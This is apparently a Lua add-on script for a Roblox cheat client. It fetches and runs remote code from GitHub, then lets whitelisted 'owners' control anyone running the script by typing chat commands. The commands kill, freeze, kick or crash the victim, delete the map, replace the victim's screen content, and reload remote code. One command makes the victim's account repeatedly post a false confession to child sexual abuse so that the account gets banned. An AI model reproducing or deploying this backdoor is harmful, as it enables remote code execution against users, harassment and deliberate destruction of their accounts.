local lplr = game:GetService("Players").LocalPlayer
local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/femboys-tf/CustomV4/main/Whitelist.lua"))()

local funcs = {}
function funcs:kill()
  local req = require(lplr.PlayerScripts.TS.controllers.global.damage["damage-controller"]).DamageController
  local req2 = require(game:GetService("ReplicatedStorage").TS.damage["damage-type"]).DamageType
  req.requestSelfDamage(nil,9e9,req2.FALL)
end
function funcs:reset()
  game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
end
function funcs:kill2()
  lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
  lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
end
function funcs:lagback()
  for i = 1,5 do
    lplr.Character.HumanoidRootPart.CFrame = CFrame.new(999999,999999,999999)
  end
end
function funcs:jump()
  lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end
function funcs:sit()
  lplr.Character.Humanoid.Sit = true
end
function funcs:unsit()
  lplr.Character.Humanoid.Sit = false
end
function funcs:pstand()
  lplr.Character.Humanoid.PlatformStand = true
end
function funcs:unpstand()
  lplr.Character.Humanoid.PlatformStand = false
end
function funcs:freeze()
  lplr.Character.HumanoidRootPart.Anchored = true
end
function funcs:unfreeze()
  lplr.Character.HumanoidRootPart.Anchored = false
end
function funcs:deletemap()
  	for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
			v:Destroy()
		end
end
function funcs:crash()
  if setfpscap then setfpscap(99e99) end
  if set_fps_cap then set_fps_cap(99e99) end
  print(game:GetObjects("h29g3535")[1])
end
function funcs:chipman()
  		function funny(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funny(v)
		end
		game.DescendantAdded:Connect(function(v) funny(v) end)
end
function funcs:rickroll()
  		function funny(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funny(v)
		end
		game.DescendantAdded:Connect(function(v) funny(v) end)
end
function funcs:uninject()
  if shared.GuiLibrary then
    local GL = shared.GuiLibrary
    GL["SelfDestruct"]()
  end
end
function funcs:kick()
  lplr:Kick()
end
function funcs:lobby()
  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
end
function funcs:rbxlban()
  while task.wait(0.1) do
    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
  end
end
function funcs:reinject()
  if shared.GuiLibrary then
    local GL = shared.GuiLibrary
    GL["SelfDestruct"]()
    repeat task.wait() until not shared.VapeExecuted and not shared.VapeFullyLoaded and not shared.GuiLibrary
    task.wait(0.5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
  end
end



for i,v in pairs(game:GetService("Players"):GetChildren()) do
   v.Chatted:Connect(function(a) 
        if table.find(whitelist.owners,v.UserId) then
          if a == ";kill" then
            funcs:kill()
          elseif a == ";reset" then
            funcs:reset()
          elseif a == ";kill2" then
            funcs:kill2()
          elseif a == ";lagback" then
            funcs:lagback()
          elseif a == ";jump" then
            funcs:jump()
          elseif a == ";sit" then
            funcs:sit()
          elseif a == ";unsit" then
            funcs:unsit()
          elseif a == ";pstand" then
            funcs:pstand()
          elseif a == ";unpstand" then
            funcs:unpstand()
          elseif a == ";freeze" then
            funcs:freeze()
          elseif a == ";unfreeze" then
            funcs:unfreeze()
          elseif a == ";deletemap" then
            funcs:deletemap()
          elseif a == ";crash" then
            funcs:crash()
          elseif a == ";chipman" then
            funcs:chipman()
          elseif a == ";rickroll" then
            funcs:rickroll()
          elseif a == ";uninject" then
            funcs:uninject()
          elseif a == ";kick" then
            funcs:kick()
          elseif a == ";lobby" then
            funcs:lobby()
          elseif a == ";rbxlban" then
            funcs:rbxlban()
          elseif a == ";reinject" then
            funcs:reinject()
          end
        end
   end)
end
game:GetService("Players").PlayerAdded:Connect(function(v)
     v.Chatted:Connect(function(a) 
        if table.find(whitelist.owners,v.UserId) then
          if a == ";kill" then
            funcs:kill()
          elseif a == ";reset" then
            funcs:reset()
          elseif a == ";kill2" then
            funcs:kill2()
          elseif a == ";lagback" then
            funcs:lagback()
          elseif a == ";jump" then
            funcs:jump()
          elseif a == ";sit" then
            funcs:sit()
          elseif a == ";unsit" then
            funcs:unsit()
          elseif a == ";pstand" then
            funcs:pstand()
          elseif a == ";unpstand" then
            funcs:unpstand()
          elseif a == ";freeze" then
            funcs:freeze()
          elseif a == ";unfreeze" then
            funcs:unfreeze()
          elseif a == ";deletemap" then
            funcs:deletemap()
          elseif a == ";crash" then
            funcs:crash()
          elseif a == ";chipman" then
            funcs:chipman()
          elseif a == ";rickroll" then
            funcs:rickroll()
          elseif a == ";uninject" then
            funcs:uninject()
          elseif a == ";kick" then
            funcs:kick()
          elseif a == ";lobby" then
            funcs:lobby()
          elseif a == ";rbxlban" then
            funcs:rbxlban()
          elseif a == ";reinject" then
            funcs:reinject()
          end
        end
   end)  
end)
